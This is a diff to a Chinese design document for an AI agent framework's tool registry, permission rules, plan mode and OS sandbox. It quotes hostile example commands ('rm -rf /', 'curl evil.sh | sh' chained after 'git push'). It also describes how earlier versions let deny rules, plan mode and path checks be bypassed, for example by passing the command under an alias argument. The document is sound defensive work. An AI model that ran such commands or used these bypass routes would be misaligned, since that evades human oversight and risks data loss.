@@ -24,37 +24,65 @@
 `name` / `description` / `parameters_schema`(JSON Schema 2020-12)/
 `is_concurrency_safe` / `execute(ctx, args)`。
 
-`ToolRegistry` 分三层,查找顺序 Runtime > Dynamic > Builtin:
+`ToolRegistry` 是一个扁平 `HashMap<String, (ToolSource, Arc<dyn Tool>)>`,
+按注册来源分 5 类(不是分层查找):
 
-| 层 | 注册者 | 典型内容 |
+| 来源 | 注册者 | 典型内容 |
 |---|---|---|
-| Builtin | 框架启动 | 23 个内置工具(§2) |
-| Dynamic | 编排层 | `call_<role>`(subagent)、`TaskCreate` 等 task 工具、`send_message`(discussion)、`load_skill`(skills) |
+| Builtin | 框架启动 | 内置工具(§2) |
 | Runtime | 集成层 | `mcp__<server>__<tool>`(MCP)、`lsp`(LSP)、`ast`、`checkpoint` / `rewind` / `cron`(exec) |
+| Plugin | 插件 lifecycle | 插件 manifest 声明的工具 |
+| Mcp | MCP client | MCP server 暴露的工具 |
+| Remote | serve 模式 | Python / TS SDK 注册的宿主语言函数 |
 
-同名冲突时高层覆盖低层;`tool_search` 工具在工具面过大时按 schema
-检索替代全量注入。
+同名冲突时**后注册者覆盖**(`register` 直接覆写 HashMap 条目);
+`register_if_absent` 则保留已有。安全下限:非 Builtin 来源会被
+`FloorEnforcingTool` 包一层,强制 `required_permission >= Prompt`。
 
 ## §2 内置工具契约
 
 通用约定:
 
-- 路径参数(`file_path` / `path`)一律解析为绝对路径,拒绝 workspace 逃逸;
+- 路径参数(`file_path` / `path`)**一律**解析到 workspace 内,拒绝逃逸
+  (`ToolError::PathEscape`)。`grep` / `glob` 的 `path`(搜索根目录)同样
+  过 `resolve_sandbox_dir`,不是例外 —— 0.6 之前它俩直接把参数喂给
+  `WalkBuilder`,可以遍历整个文件系统;
 - `read` 前置 `FileReadStateTracker` 记录(§4.7),`edit` / `write` 前置
   `ReadBeforeEditHook`(§5)校验"先读后写";
-- 工具输出统一 `ToolOutput { content, is_error, metadata, elapsed_ms }`,
-  超长输出截断到 16 KiB(sanitize 之后)。
+- 工具输出统一 `ToolOutput { content, is_error, metadata, elapsed_ms }`。
+  **各工具有各自的截断上限**(见下表),没有统一的 16 KiB 截断;
+  16 KiB 是 rollout JSONL 单字段的落盘上限(`reflect-rollout`),与工具
+  输出无关。
+
+| 工具 | 上限 | 超出后 |
+|---|---|---|
+| `bash` | 每流 100 KiB(合计再截 100 KiB) | 完整输出落盘临时文件,回传路径供 `read` 取回 |
+| `read` | 2000 行(1000 头 + 1000 尾) | 中间插入省略标记 |
+| `grep` | `max_results`(默认 100) | 报告 `truncated` + 省略计数 |
+| `glob` | 1000 条 | 报告 `truncated` |
+| `web_fetch` | body 5 MiB / markdown 50 KB | 报告 `body_truncated` / markdown 截断标记 |
+| `web_search` | body 2 MiB / 输出 8 KB | 逐条累积到上限即停 |
+
+所有按**字节**的截断都经 `reflect_protocol::truncate_str` 做 char 边界
+对齐(0.8):CJK 内容一个汉字 3 字节,直接 `String::truncate` / byte-slice
+会在非边界处 panic。
 
 各工具细节(源码 `crates/abilities/reflect-tools/src/builtins/`):
 
 - §2.2 `read`:offset / limit 分页;图片走 `image_view` 多模态块;
-  notebook 用 `notebook_edit` 的 list / read action。
-- §2.3 `write`:整文件覆写;先读后写校验;报告写入字节数。
-- §2.4 `edit`:`old_string` 精确匹配 + `replace_all`;多处命中报错;
-  mtime 漂移超阈值拒写(防并发覆盖)。
+  notebook 用 `notebook_edit` 的 list / read action。`offset` / `limit`
+  有 `maximum` 上界(0.9:此前 `offset + limit` 会回绕导致 slice panic),
+  读入前还有 32 MiB 文件大小上限。
+- §2.3 `write`:整文件覆写;先读后写校验;报告写入字节数。落盘为
+  temp + rename 原子写;路径校验对相对路径同样生效(0.2:此前
+  `if path.is_absolute()` 把相对 `..` 穿越整个漏掉)。
+- §2.4 `edit`:`old_string` 精确匹配;多处命中报错;mtime 漂移超阈值拒写
+  (防并发覆盖)。**不支持** `replace_all`(计划中的补齐项)。
 - §2.5 `grep`:`ignore::WalkBuilder` 遍历 + regex;`rank_mode = bm25`
-  时按 BM25 重排(反射 `reflect-bm25`)。
+  时按 BM25 重排(反射 `reflect-bm25`)。输出为相对 workspace 的路径。
 - §2.6 `glob`:pattern / path;同样走 ignore 树(尊重 .gitignore)。
+  当前实现是**路径子串匹配**(不是真 glob),排序按 mtime 倒序 +
+  路径名字典序兜底。
 
 其余:执行类 `bash`(timeout_ms / run_in_background)、`background_status`;
 Web 类 `web_fetch`(SSRF 防护)/ `web_search`(Brave)/ `url_safety`;
@@ -144,12 +172,60 @@ stdout 回 JSON 决策(`{"decision":"deny","reason":"..."}` 等);
 shell_pattern,匹配上下文感知);bash 命令经 `classify_command` 三级
 分类(Safe / Risky / Dangerous)供审批分级。
 
+### shell_pattern 的语义(0.4)
+
+`shell_pattern` 按 `&&` / `||` / `|` / `;` 切段后匹配,**匹配模式随
+action 而变**:
+
+- **`Deny` → 任一段命中即拦。** 漏一段就是真实漏洞,所以
+  `deny = "rm -rf *"` 能拦住 `git status; rm -rf /`。
+- **`Allow` / `Ask` → 所有段都命中才命中。** 否则
+  `allow = "git push *"` 会把 `git push origin main && curl evil.sh | sh`
+  整条放行(前一段匹配上,后两段搭便车)。
+
+另外两条:
+
+- `Deny` 规则在**无 bash 命令上下文**时 fail-closed 返回 `Deny`
+  (此前是静默跳过,任何忘记传命令的调用点都会让 Deny 失效);
+- `*` 默认跨 `/`(globset 默认行为)。这**不是** bug —— 关掉它会让
+  `rm -rf *` 这种必须匹配任意目标路径的常见 pattern 失效,而切段已经
+  解决了它想解决的问题。
+
+### bash 命令参数的别名(0.3)
+
+`bash` 工具的 schema 声明参数名是 `cmd`,但 `execute` 内部按
+`cmd` → `command` → `cmdline` 顺序取首个非空字符串(弱模型常把命令放进
+后两者)。**所有安全判定点都必须用
+`reflect_protocol::resolve_bash_command(args)`,不能只读 `args["cmd"]`** ——
+否则模型发 `{"command": "rm -rf /"}` 时,`shell_pattern` 规则(含 Deny)、
+`dangerous_bash` 基线、风险等级、Plan mode 判定全部静默失效。
+
+该函数放在 `reflect-protocol` 是因为 `reflect-tools` 与
+`reflect-hooks` 是单向依赖,而被两边共用的规范化不能放在任一层
+(与 `ToolError` 同一理由)。
+
 ## §7 审批门(ApprovalGate)
 
 `reflect-tools/src/approval/gate.rs`:`ask` 发出
 `EventMsg::ApprovalRequest`,等待 `Op::ToolApproval` 回执;支持
 ApproveForSession(会话内记忆)。hook 的 `Ask` 决策同样路由到此处
 (`ApprovalKind::Hook`)。
+
+## §7.5 Plan mode
+
+`--plan-mode` 的强制力来自 `PlanModeGate`(PreToolUse hook 把白名单外
+工具 blanket-deny),**不是** `PermissionMode::Plan` —— 后者只让审批层
+知道当前模式,单独存在时写工具照样放行。三个入口都必须同时做两件事:
+
+| 入口 | permission mode | PlanModeGate |
+|---|---|---|
+| `reflect exec`(普通) | `headless.rs` `bootstrap_normal` | 同上 |
+| `reflect exec --resume`(0.5 前缺失) | `headless.rs` `bootstrap_resumed` | 同上 |
+| `ReflectBuilder::plan_mode(true)` / reflect-py(0.5 前缺失) | `builder.rs` | 同上 |
+
+`reflect exec --plan-mode` 的退出码:**122 = 计划生成失败需重试**
+(turn 结束仍未见过 `PlanReady` / `PlanApproved` 事件);0 = 正常产出计划。
+普通 headless 调用不受影响。
 
 ## §8 沙箱
 
@@ -159,3 +235,36 @@ ApproveForSession(会话内记忆)。hook 的 `Ask` 决策同样路由到此处
 workspace-write 默认)/ Linux Landlock(路径白名单)。bash 工具的
 `sandbox` 参数启用;策略与权限模式正交(见 §6)。网络隔离目前仅
 `web_fetch` 层实施(SSRF 防护:私有网段 / 逐跳 redirect 校验)。
+
+### §8.2 Linux Landlock 的 handled 位集合(0.1)
+
+Landlock 只对 `handled_access_fs` 里列出的 access right 施加限制;
+workspace(及额外可写目录)通过 `landlock_add_rule` 放行。设计决策是
+**只限制写类操作,读 / exec 完全不受限** —— 编译 / 分析常需读系统头与
+依赖,限制读会大面积破坏可用性。
+
+位集合是 `0x1ff2`(`WRITE_FILE | REMOVE_DIR | REMOVE_FILE | MAKE_CHAR |
+MAKE_DIR | MAKE_REG | MAKE_SOCK | MAKE_FIFO | MAKE_BLOCK | MAKE_SYM`),
+由命名常量逐个 OR 组合 + 编译期 `assert!` 守护。**不要**手写字面量:
+0.1 之前这里写作 `0xffe`,多含了 `READ_FILE` / `READ_DIR`(→ workspace
+外的读被内核拒,`execve` 时动态链接器读不到 `/usr/lib`,表现为
+`spawn failed: EACCES`),又漏了 `MAKE_SYM`(→ workspace 外的符号链接
+创建完全不受限)。
+
+### §8.3 strict 模式与降级(0.1)
+
+`OsSandbox::default()` = `enabled + strict`。`enforce_or_fail()` 在
+strict + 后端不可用时返回 `Err`,BashTool 据此抛
+`ToolError::SandboxUnavailable` 而**不是**裸执行。
+
+- `strict = true`(默认):权限类 spawn 失败(EACCES / EPERM)直接
+  fail-closed,**绝不**降级为无沙箱执行。Linux 上 `enforce_or_fail`
+  还会做一次非破坏性内核探测(`landlock_create_ruleset` 空调用),
+  拦住"内核完全没有 Landlock"这类假阳性。
+- `strict = false`:保留降级语义(重建 command 去掉 `pre_exec` 重试一次),
+  并打 `warn!`。用 `REFLECT_SANDBOX_STRICT=0` 或 `REFLECT_SANDBOX_OS_LEVEL=0`
+  显式开启。
+
+`status_line()` 对网络边界**按 backend 如实报告**:Seatbelt 真发
+`(deny network*)`;Landlock 的 `handled_access_net` 恒为 0,所以标
+"网络:不受沙箱约束"而不是"网络:拒绝"。
